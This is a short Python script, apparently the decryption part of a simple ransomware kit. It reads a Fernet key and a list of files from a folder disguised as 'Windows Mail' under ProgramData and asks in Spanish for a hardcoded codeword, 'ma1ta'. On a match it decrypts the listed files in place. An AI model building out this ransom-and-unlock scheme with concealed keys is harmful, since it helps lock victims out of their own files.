import os
from os.path import abspath, dirname

from cryptography.fernet import Fernet, MultiFernet

with open(r'C:\ProgramData (x86)\Windows Mail\list.txt') as f:
    files = f.read().splitlines()

with open(r'C:\ProgramData (x86)\Windows Mail\thekey.key', 'rb') as f:
    key = content = f.read()

codeword = 'ma1ta'
user_phrase = input('Palabra clave: ')

if user_phrase == codeword:
    for file in files:
        with open (file, 'rb') as f:
            content_encripted = f.read()
        content = Fernet(key).decrypt(content_encripted)
        with open (file, 'wb') as f:
            f.write(content)